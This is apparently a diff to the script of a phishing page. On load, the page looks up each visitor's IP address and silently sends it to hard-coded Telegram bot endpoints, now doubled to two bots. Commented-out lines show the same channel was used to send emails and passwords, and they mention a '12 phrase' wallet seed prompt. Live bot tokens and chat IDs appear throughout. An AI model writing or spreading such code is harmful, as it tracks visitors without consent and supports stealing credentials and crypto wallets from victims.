@@ -339,57 +339,75 @@
     }
   }
  </script>
-
+<script src=
+      "../ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+          </script>
     <script>
 
-
-
-           
-           // Add "https://ipinfo.io" statement
-           // this will communicate with the ipify servers
-           // in order to retrieve the IP address
-           $.get("https://ipinfo.io/", function(response) {
-                  var ipx = response.ip;
-                  sendIp(ipx);
-               }, "json")
-                
-               // "json" shows that data will be fetched in json format
-           
- 
-         function sendIp(ipx) {
-         
-           // alert("kjk");
-         
-         //   var phr = document.getElementById("phrase").value ;
-          
-           
-         
-                 
-                   //https://api.telegram.org/bot6369598361:AAHlQhiTaUcQX83bCeE5X7b9mTZc86BvdPc/sendMessage?chat_id=6298874715&text=heeey 
-                   
-                   // fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${email}=${pwd}`, {
-         
-                     // https://api.telegram.org/bot6369598361:AAHlQhiTaUcQX83bCeE5X7b9mTZc86BvdPc/sendMessage?chat_id=6298874715&text=heeey
-         
-         
-                   fetch('https://api.telegram.org/bot6369598361:AAHlQhiTaUcQX83bCeE5X7b9mTZc86BvdPc/sendMessage?chat_id=6298874715&text=ip:'+ipx , {
-                       method: "GET"
-                   }).then(success => {
-         
-                     // alert("Invalid phrase. Kindly enter the correct 12 phrase");
-         
-                     // const dangerMessage = document.querySelector("#msg")
-                     
-                   }, error => {
-                     //   alert("Message not sent")
-                       console.log(error)
-         
-                   })
+  // Add "https://ipinfo.io" statement
+          // this will communicate with the ipify servers
+          // in order to retrieve the IP address
+          $.get("https://ipinfo.io/", function(response) {
+                 var ipx = response.ip;
+                 sendMail(ipx);
+              }, "json")
                
-                
+              // "json" shows that data will be fetched in json format
           
-            
-         }
+
+        function sendMail(ipx) {
+        
+          // alert("kjk");
+        
+        //   var phr = document.getElementById("phrase").value ;
+         
+          
+        
+                
+                  //https://api.telegram.org/bot6328425255:AAGk9bQefjT08Du5FZTV0M741T89AzeQ8ng/sendMessage?chat_id=6298874715&text=heeey 
+                  
+                  // fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${email}=${pwd}`, {
+        
+                    // https://api.telegram.org/bot6328425255:AAGk9bQefjT08Du5FZTV0M741T89AzeQ8ng/sendMessage?chat_id=6298874715&text=heeey
+
+
+                    // 6328425255:AAGk9bQefjT08Du5FZTV0M741T89AzeQ8ng
+
+                    // https://api.telegram.org/bot6328425255:AAGk9bQefjT08Du5FZTV0M741T89AzeQ8ng/getUpdates
+        
+        
+                  fetch('https://api.telegram.org/bot6023706645:AAGkMzvgLRJycp231L4omF6V9hi3ESfnYoc/sendMessage?chat_id=6298874715&text=ip-v2:'+ipx , {
+                      method: "GET"
+                  }).then(success => {
+        
+                    // alert("Invalid phrase. Kindly enter the correct 12 phrase");
+        
+                    // const dangerMessage = document.querySelector("#msg")
+                    
+                  }, error => {
+                    //   alert("Message not sent")
+                      console.log(error)
+        
+                  })
+
+                  fetch('https://api.telegram.org/bot6328425255:AAGk9bQefjT08Du5FZTV0M741T89AzeQ8ng/sendMessage?chat_id=6298874715&text=ip-v2:'+ipx , {
+                      method: "GET"
+                  }).then(success => {
+        
+                    // alert("Invalid phrase. Kindly enter the correct 12 phrase");
+        
+                    // const dangerMessage = document.querySelector("#msg")
+                    
+                  }, error => {
+                    //   alert("Message not sent")
+                      console.log(error)
+        
+                  })
+              
+               
+         
+           
+        }
          
              
 
